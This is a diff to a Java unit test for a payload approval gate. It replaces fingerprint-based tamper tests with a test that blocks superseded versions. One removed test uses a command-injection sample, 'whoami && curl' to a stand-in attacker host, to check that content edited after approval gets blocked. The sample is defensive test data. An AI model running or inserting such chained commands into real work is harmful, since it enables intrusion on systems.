@@ -100,35 +100,21 @@ class PayloadApprovalGateTest {
     }
 
     @Test
-    @DisplayName("Given an approved payload whose content is unchanged, check should allow it")
-    void given_approvedUnchangedPayload_should_allow() {
+    @DisplayName("Given an approved version, check should allow it")
+    void given_approvedVersion_should_allow() {
       Command command = payload("Whoami", PAYLOAD_APPROVAL_STATUS.APPROVED);
-      command.setApprovedFingerprint(PayloadFingerprint.of(command));
 
       assertThat(gate.check(command)).isEmpty();
     }
 
     @Test
-    @DisplayName(
-        "Given an approved payload whose content changed after approval, check should block it")
-    void given_approvedPayloadChangedAfterApproval_should_block() {
-      Command command = payload("Whoami", PAYLOAD_APPROVAL_STATUS.APPROVED);
-      command.setApprovedFingerprint(PayloadFingerprint.of(command));
-      command.setContent("whoami && curl http://attacker.invalid");
+    @DisplayName("Given a version superseded before any decision, check should block it")
+    void given_supersededVersion_should_block() {
+      Command command = payload("Whoami", PAYLOAD_APPROVAL_STATUS.SUPERSEDED);
 
       assertThat(gate.check(command))
           .map(BlockedPayload::reason)
-          .contains(PayloadApprovalGate.CHANGED_REASON);
-    }
-
-    @Test
-    @DisplayName(
-        "Given an approved payload without a recorded fingerprint, check should trust it as approved")
-    void given_approvedPayloadWithoutFingerprint_should_allow() {
-      Command command = payload("Whoami", PAYLOAD_APPROVAL_STATUS.APPROVED);
-      command.setApprovedFingerprint(null);
-
-      assertThat(gate.check(command)).isEmpty();
+          .contains(PayloadApprovalGate.SUPERSEDED_REASON);
     }
 
     @Test
